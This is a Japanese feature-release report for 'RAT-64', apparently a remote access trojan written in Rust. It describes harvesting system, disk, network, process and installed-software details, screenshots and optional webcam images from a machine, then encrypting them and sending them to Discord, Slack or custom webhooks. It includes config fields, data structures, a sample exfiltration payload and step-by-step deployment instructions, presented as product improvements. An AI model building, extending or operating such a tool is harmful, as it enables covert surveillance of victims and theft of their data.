# RAT-64 機能強化レポート 🚀

## 新機能概要

### 1. 📊 詳細システム情報収集の強化

#### 追加された情報項目
- **メモリ情報**: 総メモリ容量、使用可能メモリ
- **ディスク情報**: ドライブ一覧、ファイルシステム、容量情報
- **ネットワーク情報**: ネットワークインターフェース、IPアドレス一覧
- **プロセス情報**: 実行中プロセス一覧（CPU使用率、メモリ使用量含む）
- **インストールソフト**: インストール済みアプリケーション一覧
- **スタートアップ**: 自動起動プログラム一覧
- **システム詳細**: システム稼働時間、タイムゾーン、言語、アーキテクチャ

#### データ構造の拡張
```rust
// 新しい詳細構造体
struct DiskInfo {
    name: String,
    file_system: String,
    total_space: u64,
    available_space: u64,
    mount_point: String,
}

struct NetworkInterface {
    name: String,
    ip_addresses: Vec<String>,
    mac_address: String,
    is_up: bool,
}

struct ProcessInfo {
    name: String,
    pid: u32,
    cpu_usage: f32,
    memory_usage: u64,
    exe_path: String,
}
```

---

## 2. 🌐 Webhook送信機能

### 対応Webhookタイプ
- **Discord**: リッチエンベッド形式で送信
- **Slack**: ブロック形式で送信
- **Custom**: JSONペイロード形式で送信

### Discord送信例
```json
{
  "embeds": [{
    "title": "🖥️ システム情報レポート",
    "color": 0x00ff00,
    "fields": [
      {"name": "ホスト名", "value": "PC-NAME", "inline": true},
      {"name": "OS", "value": "Windows 10.0.26100", "inline": true},
      {"name": "CPU", "value": "Intel i9-13980HX (32 cores)", "inline": true},
      {"name": "メモリ", "value": "16.2 GB / 32.0 GB", "inline": true}
    ],
    "timestamp": "2025-09-21T00:00:00Z"
  }]
}
```

---

## 3. ⚙️ 設定ファイルシステム

### config.json構造
```json
{
  "webhook_url": "https://discord.com/api/webhooks/...",
  "webhook_type": "Discord",
  "collect_screenshots": true,
  "collect_webcam": false,
  "collect_processes": true,
  "collect_software": true,
  "max_processes": 20,
  "retry_attempts": 3,
  "timeout_seconds": 30
}
```

### 設定オプション解説
| オプション | 説明 | デフォルト値 |
|-----------|------|-------------|
| `webhook_url` | Webhook送信先URL | `null` |
| `webhook_type` | Discord/Slack/Custom/None | `None` |
| `collect_screenshots` | スクリーンショット収集 | `true` |
| `collect_webcam` | Webカメラ画像収集 | `false` |
| `collect_processes` | プロセス一覧収集 | `true` |
| `collect_software` | ソフトウェア一覧収集 | `true` |
| `max_processes` | 最大プロセス収集数 | `20` |
| `retry_attempts` | 送信リトライ回数 | `3` |
| `timeout_seconds` | 送信タイムアウト | `30` |

---

## 4. 🔄 処理フロー図

```
[設定読み込み] → [詳細情報収集] → [暗号化] → [Webhook送信]
      ↓              ↓              ↓          ↓
  config.json    SystemInfo+     data.dat   Discord/
                 DiskInfo+        key.bin    Slack/
                 ProcessInfo+               Custom
                 NetworkInfo
```

---

## 5. 🛡️ セキュリティ強化

### エラーハンドリング
- **リトライ機能**: 送信失敗時の自動リトライ
- **タイムアウト制御**: 長時間の応答待機を防止
- **設定検証**: 不正な設定値の検出と修正

### 設定管理
- **デフォルト設定**: 安全なデフォルト値の提供
- **設定例ファイル**: 詳細な設定ガイドを含む例
- **動的設定**: 実行時の設定変更対応

---

## 6. 📈 パフォーマンス向上

### データ収集の最適化
- **選択的収集**: 不要な情報の収集をスキップ
- **プロセス制限**: メモリ使用量を制御
- **並行処理**: 情報収集の高速化

### 通信の最適化
- **JSON圧縮**: ペイロードサイズの最小化
- **接続プール**: HTTP接続の再利用
- **バッチ送信**: 複数データの一括送信

---

## 7. 🚀 使用方法

### 基本的な使い方
1. **設定ファイル作成**:
   ```bash
   # config.example.json をコピーして編集
   cp config.example.json config.json
   ```

2. **Webhook URLの設定**:
   ```json
   {
     "webhook_url": "YOUR_WEBHOOK_URL",
     "webhook_type": "Discord"
   }
   ```

3. **実行**:
   ```bash
   rat_64.exe
   ```

### Discord Webhook設定
1. Discordサーバーの設定 → 連携サービス → ウェブフック
2. ウェブフックを作成してURLをコピー
3. config.jsonに貼り付け

### Slack Webhook設定
1. Slack App管理画面でIncoming Webhooksを有効化
2. Webhook URLを生成
3. config.jsonに設定

---

## 8. 🔧 トラブルシューティング

### よくある問題
1. **Webhook送信失敗**: URL、ネットワーク接続を確認
2. **情報収集エラー**: 管理者権限での実行を試す
3. **設定ファイルエラー**: JSON形式の正当性を確認

### ログ出力例
```
✅ 設定ファイル読み込み完了
📊 システム情報収集中...
🔐 データ暗号化完了
🌐 Webhook送信成功 (1回目の試行)
💾 ファイル保存完了: data.dat, key.bin
```

---

この機能強化により、RAT-64は大幅にパワーアップし、より詳細な情報収集とリアルタイム通知が可能になりました！ 🎉